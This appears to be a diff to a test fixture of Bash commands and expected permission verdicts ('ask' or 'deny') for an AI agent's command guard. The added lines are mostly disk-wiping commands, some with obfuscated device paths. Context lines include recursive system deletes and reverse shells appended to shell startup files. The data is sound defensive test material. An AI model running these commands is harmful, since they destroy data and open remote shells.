@@ -344,6 +344,11 @@
 {"tool": "Bash", "args": {"command": "hf upload acme/model ./out"}, "expect": "ask", "note": "upload model weights via hf CLI"}
 {"tool": "Bash", "args": {"command": "ollama push acme/model"}, "expect": "ask", "note": "publish model weights to Ollama registry"}
 {"tool": "Bash", "args": {"command": "cp new.safetensors /srv/models/prod/model.safetensors"}, "expect": "ask", "note": "overwrite model weights in production"}
+{"tool": "Bash", "args": {"command": "dd if=/dev/zero of=/dev/sda bs=1M"}, "expect": "ask", "note": "wiping a whole disk with dd"}
+{"tool": "Bash", "args": {"command": "mkfs.ext4 /dev/sda1"}, "expect": "ask", "note": "making a filesystem on a disk partition"}
+{"tool": "Bash", "args": {"command": "shred -n 3 -z /dev/sdb"}, "expect": "ask", "note": "shredding a whole disk"}
+{"tool": "Bash", "args": {"command": "wipefs -a /dev/sdb"}, "expect": "ask", "note": "wiping a disk's filesystem signatures"}
+{"tool": "Bash", "args": {"command": "diskutil eraseDisk JHFS+ Wiped /dev/disk2"}, "expect": "ask", "note": "erasing a whole disk on macOS"}
 {"tool": "Bash", "args": {"command": "rm -rf /var /etc"}, "expect": "deny", "note": "a recursive delete of two system folders (#749)"}
 {"tool": "Bash", "args": {"command": "chmod -R 000 /"}, "expect": "deny", "note": "locking every file from root down (#749)"}
 {"tool": "Bash", "args": {"command": "find /srv -type f -delete"}, "expect": "deny", "note": "every file under a system folder deleted with find (#749)"}
@@ -398,3 +403,18 @@
 {"tool": "Bash", "args": {"command": "echo 'ncat --exec /bin/sh 192.0.2.7 4444' >> ~/.zshrc"}, "expect": "ask", "note": "ncat --exec appended to zshrc (#750)"}
 {"tool": "Bash", "args": {"command": "echo 'sh -i >& /dev/udp/192.0.2.7/4444 0>&1' >> ~/.bashrc"}, "expect": "ask", "note": "a /dev/udp/ shell appended to bashrc (#750)"}
 {"tool": "Bash", "args": {"command": "echo 'bash -i >& /dev/tcp/192.0.2.7/4444 0>&1' >> ~/.zshenv"}, "expect": "ask", "note": "a reverse shell appended to zshenv (#750)"}
+{"tool": "Bash", "args": {"command": "dd if=img of=/dev/rdisk2 bs=1m"}, "expect": "ask", "note": "wiping a macOS raw disk with dd"}
+{"tool": "Bash", "args": {"command": "newfs_hfs /dev/rdisk3s1"}, "expect": "ask", "note": "making a filesystem on a macOS raw disk partition"}
+{"tool": "Bash", "args": {"command": "diskutil erasedisk JHFS+ Wiped disk2"}, "expect": "ask", "note": "erasing a whole disk on macOS, the verb in lower case"}
+{"tool": "Bash", "args": {"command": "diskutil ZERODISK /dev/disk3"}, "expect": "ask", "note": "zeroing a whole disk on macOS, the verb in upper case"}
+{"tool": "Bash", "args": {"command": "diskutil secureErase 0 /dev/disk2"}, "expect": "ask", "note": "secure-erasing a whole disk on macOS"}
+{"tool": "Bash", "args": {"command": "diskutil randomDisk /dev/disk2"}, "expect": "ask", "note": "writing random data over a whole disk on macOS"}
+{"tool": "Bash", "args": {"command": "diskutil reformat /dev/disk2s1"}, "expect": "ask", "note": "reformatting a disk partition on macOS"}
+{"tool": "Bash", "args": {"command": "dd if=/dev/zero of=//dev/sda"}, "expect": "ask", "note": "wiping a whole disk with dd, the device with an extra slash"}
+{"tool": "Bash", "args": {"command": "dd if=/dev/zero of=/dev//sda"}, "expect": "ask", "note": "wiping a whole disk with dd, the device with a doubled slash"}
+{"tool": "Bash", "args": {"command": "dd if=/dev/zero of=/dev/./sda"}, "expect": "ask", "note": "wiping a whole disk with dd, the device spelled with a dot"}
+{"tool": "Bash", "args": {"command": "cat ubuntu.iso > /dev/sdb"}, "expect": "ask", "note": "writing an image to a whole disk with cat"}
+{"tool": "Bash", "args": {"command": "cp ubuntu.iso /dev/sdb"}, "expect": "ask", "note": "copying an image onto a whole disk"}
+{"tool": "Bash", "args": {"command": "head -c 1G /dev/zero > /dev/sda"}, "expect": "ask", "note": "writing zeros to a whole disk with head"}
+{"tool": "Bash", "args": {"command": "tee /dev/sda < image.bin"}, "expect": "ask", "note": "writing an image to a whole disk with tee"}
+{"tool": "Bash", "args": {"command": "mkfs.ext4 -F -L root -O ^has_journal -E lazy_itable_init=0 -m 0 /dev/sda1"}, "expect": "ask", "note": "making a filesystem on a disk partition after nine options"}
